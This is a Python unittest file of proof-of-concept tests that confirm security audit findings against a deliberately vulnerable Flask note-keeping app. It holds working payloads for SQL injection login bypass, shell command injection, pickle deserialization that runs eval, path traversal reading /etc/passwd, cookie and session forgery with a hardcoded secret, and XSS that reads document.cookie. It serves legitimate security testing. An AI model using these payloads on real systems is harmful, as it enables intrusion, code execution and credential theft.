"""
Proof-of-concept tests: each test DEMONSTRATES that a finding from
AUDIT_REPORT.md is really exploitable in the original application.
A passing test here = the vulnerability exists.

    python3 -m unittest discover -s tests -v
"""
import base64
import hashlib
import importlib.util
import os
import pickle
import shutil
import tempfile
import unittest

from flask.sessions import SecureCookieSessionInterface

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def load_vulnerable():
    spec = importlib.util.spec_from_file_location("vuln_app", os.path.join(ROOT, "vulnerable_app", "app.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class _EvalPayload:
    """Harmless proof of code execution: pickle calls eval() on load."""
    def __reduce__(self):
        return (eval, ("['executed'] * 7",))


class VulnerableAppPoC(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.v = load_vulnerable()
        self.v.DB_PATH = os.path.join(self.tmp, "db.sqlite")
        self.v.UPLOAD_DIR = os.path.join(self.tmp, "uploads")
        self.v.init_db()
        self.v.app.config["TESTING"] = True
        self.c = self.v.app.test_client()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def login(self, user, pwd, next_url=None):
        url = "/login" + (f"?next={next_url}" if next_url else "")
        return self.c.post(url, data={"username": user, "password": pwd})

    # V-01
    def test_v01_sql_injection_login_bypass(self):
        r = self.login("admin' -- ", "wrong-password")
        self.assertEqual(r.status_code, 302)
        with self.c.session_transaction() as s:
            self.assertEqual(s["username"], "admin")
            self.assertEqual(s["role"], "admin")

    # V-02
    def test_v02_command_injection(self):
        self.login("alice", "alice2024")
        r = self.c.get("/tools/ping", query_string={"host": "127.0.0.1; echo INJECTED_$((6*7))"})
        self.assertIn(b"INJECTED_42", r.data)

    # V-03
    def test_v03_insecure_deserialization_executes_code(self):
        payload = base64.b64encode(pickle.dumps(_EvalPayload())).decode()
        r = self.c.post("/import", data={"data": payload})
        self.assertIn(b"Imported 7 notes", r.data)

    # V-04
    def test_v04_path_traversal_reads_source_code(self):
        # os.path.join(UPLOAD_DIR, "/abs/path") discards UPLOAD_DIR entirely;
        # "../" sequences work the same way (e.g. ../../etc/passwd)
        target = os.path.join(ROOT, "vulnerable_app", "app.py")
        r = self.c.get("/download", query_string={"file": target})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"app.secret_key", r.data)
        r = self.c.get("/download", query_string={"file": "../../../../../../etc/passwd"})
        self.assertIn(b"root:", r.data)

    # V-05
    def test_v05_upload_overwrites_files_outside_upload_dir(self):
        from io import BytesIO
        r = self.c.post("/upload", data={"file": (BytesIO(b"owned"), "../planted.py")},
                        content_type="multipart/form-data")
        self.assertEqual(r.status_code, 200)
        self.assertTrue(os.path.exists(os.path.join(self.tmp, "planted.py")))

    # V-06
    def test_v06_idor_read_other_users_note(self):
        self.login("alice", "alice2024")
        r = self.c.get("/note/1")                      # note 1 belongs to admin
        self.assertIn(b"Root VPN password", r.data)

    # V-07
    def test_v07_admin_access_with_forged_cookie(self):
        self.c.set_cookie("role", "admin")
        r = self.c.get("/admin/users")
        self.assertEqual(r.status_code, 200)
        self.assertIn(hashlib.md5(b"admin123").hexdigest().encode(), r.data)

    # V-08
    def test_v08_reflected_and_stored_xss(self):
        r = self.c.get("/search", query_string={"q": "<script>alert(1)</script>"})
        self.assertIn(b"<script>alert(1)</script>", r.data)
        self.login("alice", "alice2024")
        self.c.post("/notes", data={"title": "x", "body": "<img src=x onerror=alert(document.cookie)>"})
        self.assertIn(b"<img src=x onerror=alert(document.cookie)>", self.c.get("/notes").data)

    # V-09
    def test_v09_unsalted_md5_password_storage(self):
        import sqlite3
        db = sqlite3.connect(self.v.DB_PATH)
        stored = db.execute("SELECT password FROM users WHERE username='alice'").fetchone()[0]
        db.close()
        self.assertEqual(stored, hashlib.md5(b"alice2024").hexdigest())   # crackable instantly

    # V-10
    def test_v10_session_forgery_with_hardcoded_secret(self):
        serializer = SecureCookieSessionInterface().get_signing_serializer(self.v.app)
        forged = serializer.dumps({"user_id": 1, "username": "admin", "role": "admin"})
        self.c.set_cookie("session", forged)
        r = self.c.get("/admin/users")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(self.v.app.secret_key, "notekeeper-secret-123")

    # V-12
    def test_v12_stack_trace_disclosure(self):
        r = self.c.post("/import", data={"data": "not-base64!!"})
        self.assertEqual(r.status_code, 500)
        self.assertIn(b"Traceback (most recent call last)", r.data)

    # V-13
    def test_v13_open_redirect(self):
        r = self.login("alice", "alice2024", next_url="https://evil.example/phish")
        self.assertEqual(r.headers["Location"], "https://evil.example/phish")

    # V-14
    def test_v14_no_csrf_protection(self):
        self.login("alice", "alice2024")
        r = self.c.post("/notes", data={"title": "csrf", "body": "forged by another site"})
        self.assertEqual(r.status_code, 200)

    # V-15
    def test_v15_missing_security_headers(self):
        r = self.c.get("/")
        for h in ("Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options"):
            self.assertNotIn(h, r.headers)

    # V-16
    def test_v16_no_bruteforce_protection(self):
        for _ in range(20):
            self.assertEqual(self.login("alice", "guess").status_code, 401)
        self.assertEqual(self.login("alice", "alice2024").status_code, 302)


if __name__ == "__main__":
    unittest.main(verbosity=2)
